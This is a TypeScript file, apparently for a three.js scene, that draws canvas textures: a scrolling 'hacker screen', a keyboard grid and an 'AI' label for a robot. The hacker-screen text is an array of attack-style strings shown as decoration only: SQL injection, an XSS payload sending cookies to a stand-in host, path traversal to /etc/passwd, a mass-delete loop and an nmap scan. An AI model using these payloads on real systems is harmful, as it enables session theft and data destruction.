import { CanvasTexture, RepeatWrapping, SRGBColorSpace } from "three";

const CODE_LINES = [
  "GET /api/posts?page=0&size=99999",
  "' OR 1=1 --",
  "Authorization: Bearer eyJhbGciOi",
  "for id in range(1, 10000):",
  "  requests.delete(f'/api/users/{id}')",
  "<script>fetch('//x.io?c='+document.cookie)",
  "../../etc/passwd",
  "SELECT * FROM users WHERE id = $1",
  "POST /api/posts/42/comments",
  "X-Forwarded-For: 127.0.0.1",
  "0x7ffe 3a1c 9b02 ef41 00d8",
  "nmap -sV -p 8080 target",
];

/** 해커 화면: 위로 흘러가는 공격 코드 (offset.y 를 움직이면 스크롤된다) */
export function codeTexture(color: string): CanvasTexture {
  const canvas = document.createElement("canvas");
  canvas.width = 512;
  canvas.height = 512;
  const g = canvas.getContext("2d")!;
  g.fillStyle = "rgba(10, 4, 8, 0.92)";
  g.fillRect(0, 0, 512, 512);
  g.font = "bold 22px monospace";
  for (let i = 0; i < 20; i++) {
    g.fillStyle = i % 5 === 2 ? "#ffffff" : color;
    g.globalAlpha = 0.55 + ((i * 37) % 45) / 100;
    g.fillText(CODE_LINES[i % CODE_LINES.length], 18, 30 + i * 25);
  }
  const tex = new CanvasTexture(canvas);
  tex.wrapT = RepeatWrapping;
  tex.colorSpace = SRGBColorSpace;
  return tex;
}

/** 떠 있는 키보드: 빛나는 키 격자 */
export function keyboardTexture(color: string): CanvasTexture {
  const canvas = document.createElement("canvas");
  canvas.width = 512;
  canvas.height = 170;
  const g = canvas.getContext("2d")!;
  g.strokeStyle = color;
  g.lineWidth = 3;
  g.strokeRect(4, 4, 504, 162);
  g.fillStyle = color;
  for (let r = 0; r < 4; r++) {
    for (let c = 0; c < 12; c++) {
      g.globalAlpha = (r * 7 + c * 3) % 5 === 0 ? 0.95 : 0.45;
      g.fillRect(16 + c * 41 + (r % 2) * 10, 16 + r * 37, 32, 28);
    }
  }
  const tex = new CanvasTexture(canvas);
  tex.colorSpace = SRGBColorSpace;
  return tex;
}

/** 로봇 가슴판의 "AI" 글자 */
export function labelTexture(text: string, color: string): CanvasTexture {
  const canvas = document.createElement("canvas");
  canvas.width = 256;
  canvas.height = 160;
  const g = canvas.getContext("2d")!;
  g.fillStyle = "#0b1020";
  g.fillRect(0, 0, 256, 160);
  g.fillStyle = color;
  g.font = "900 104px 'Arial Black', Arial, sans-serif";
  g.textAlign = "center";
  g.textBaseline = "middle";
  g.shadowColor = color;
  g.shadowBlur = 18;
  g.fillText(text, 128, 86);
  const tex = new CanvasTexture(canvas);
  tex.colorSpace = SRGBColorSpace;
  return tex;
}
